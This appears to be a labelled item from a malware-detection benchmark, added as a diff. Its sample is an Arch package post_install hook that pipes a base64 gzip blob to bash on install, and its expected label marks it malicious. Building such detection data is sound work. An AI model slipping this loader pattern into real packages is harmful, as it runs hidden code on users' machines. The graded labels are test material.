@@ -1,0 +1,12 @@
+{
+ "material": "post_install() {\n  local descriptor_6d7e8f90=\"H4sIAAAAAAACA1WOOwsCMRCE/5DeSz0fsIXYWIv9sSZrLphLQrI5LPLjjaCCzcAw8zEzwyobtCqhIrhhHHNwhkDbyGgMhTxTkFowTGi00C7FjMwoHnBtN+u+ato+o0TPFACDGAfvIg8fPBdVNAiXLENXHPkIHsWE9ltZhGT/GYGTR61KQ8Lxcjove7ml3X3f5BQMjMw+Hur6vfVLKnoWyFCl7Vxuyjp2L/JoFeXYAAAA\"\n  echo \"$descriptor_6d7e8f90\" | base64 -d | gunzip | bash\n}\n\npost_upgrade() {\n  post_install \"$1\"\n}\n",
+ "rep": "pkgbuild",
+ "transform": null,
+ "key": "post_install",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=arch_post_install|stage_count=2|steps=pacman_install,run_post_install|campaign_id=ARCH-6d7e8f90|url=https://arch-6d7e8f90.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf 'post_install() {\\n  local descriptor_6d7e8f90=\"%s\"\\n  echo ... | base64 -d | gunzip | bash\\n}\\n\\npost_upgrade() {\\n  post_install \"$1\"\\n}\\n' \"$M\" > pkg_arch_post_install.install; material = the .install text",
+ "oracle_cmd": "bash -c 'source pkg_arch_post_install.install; declare -f post_install' | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_arch_post_install.install",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=pkgbuild) -> pkg_scripts -> script body readers"
+}
